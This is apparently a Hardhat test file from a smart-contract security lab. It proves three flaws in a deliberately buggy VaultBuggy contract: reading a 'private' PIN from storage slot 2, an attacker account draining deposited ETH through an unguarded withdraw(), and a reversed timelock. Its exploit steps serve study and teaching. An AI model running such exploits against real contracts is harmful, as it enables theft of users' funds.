const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Lab 10 - VaultBuggy Vulnerability Analysis & Storage Exploit", function () {
  let vaultBuggy;
  let owner, attacker;
  const PIN_SECRET = 123456; // 0x1e240 trong he thap luc phan
  const LOCK_SECONDS = 3600;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();
    const VaultBuggyFactory = await ethers.getContractFactory("VaultBuggy");
    vaultBuggy = await VaultBuggyFactory.deploy(LOCK_SECONDS, PIN_SECRET);
    await vaultBuggy.waitForDeployment();
  });

  // ================= BƯỚC 3: CHỨNG MINH LỖ HỔNG LỘ BIẾN PRIVATE QUA STORAGE SLOT 2 =================
  it("Loi 1 (Thuc nghiem Buoc 3): Doc trom bien private emergencyPin tu o nho thu 2 (slot 2)", async function () {
    const contractAddress = await vaultBuggy.getAddress();

    // Goi truc tiep eth_getStorageAt de doc o nho slot 2 (noi chua emergencyPin)
    const storageValueHex = await ethers.provider.getStorage(contractAddress, 2);
    const recoveredPin = Number(storageValueHex);

    console.log("--------------------------------------------------");
    console.log("--> Dia chi hop dong VaultBuggy:", contractAddress);
    console.log("--> Gia tri tho doc tu Slot 2 (Hex):", storageValueHex);
    console.log("--> Gia tri PIN giai ma duoc:", recoveredPin);
    console.log("--------------------------------------------------");

    // Chung minh gia tri doc duoc trung khop 100% voi bien private PIN_SECRET
    expect(recoveredPin).to.equal(PIN_SECRET);
  });

  // ================= LỖI 2: THIẾU KIỂM TRA QUYỀN SỞ HỮU (MISSING ACCESS CONTROL) =================
  it("Loi 2: Ke tan cong (Attacker) rut sach tien trong ket vi withdraw() khong kiem tra owner", async function () {
    // 1. Owner nap 2 ETH vao ket
    await vaultBuggy.connect(owner).deposit({ value: ethers.parseEther("2.0") });
    const contractAddress = await vaultBuggy.getAddress();
    expect(await ethers.provider.getBalance(contractAddress)).to.equal(ethers.parseEther("2.0"));

    // 2. Attacker goi withdraw() khi con trong thoi gian khoa -> Rut sach tien!
    const balanceBefore = await ethers.provider.getBalance(attacker.address);
    const tx = await vaultBuggy.connect(attacker).withdraw();
    const receipt = await tx.wait();
    const gasUsed = receipt.gasUsed * receipt.gasPrice;
    const balanceAfter = await ethers.provider.getBalance(attacker.address);

    // So du trong hop dong bi rut ve 0
    expect(await ethers.provider.getBalance(contractAddress)).to.equal(0);
    // Attacker nhan duoc gan tron ven 2 ETH (tru phi gas)
    expect(balanceAfter).to.be.closeTo(balanceBefore + ethers.parseEther("2.0") - gasUsed, ethers.parseEther("0.001"));
  });

  // ================= LỖI 3: LOGIC NGƯỢC THỜI GIAN (REVERSE TIMELOCK) =================
  it("Loi 3: Khi het han khoa (block.timestamp > unlockTime), withdraw() bi khoa vinh vien", async function () {
    await vaultBuggy.connect(owner).deposit({ value: ethers.parseEther("1.0") });

    // Tua thoi gian vuot qua unlockTime (3605 giay)
    await ethers.provider.send("evm_increaseTime", [3605]);
    await ethers.provider.send("evm_mine");

    // Do dieu kien loi: block.timestamp <= unlockTime, nen khi het han rut tien lai bi revert!
    await expect(
      vaultBuggy.connect(owner).withdraw()
    ).to.be.revertedWith("Chua den han rut tien");
  });
});
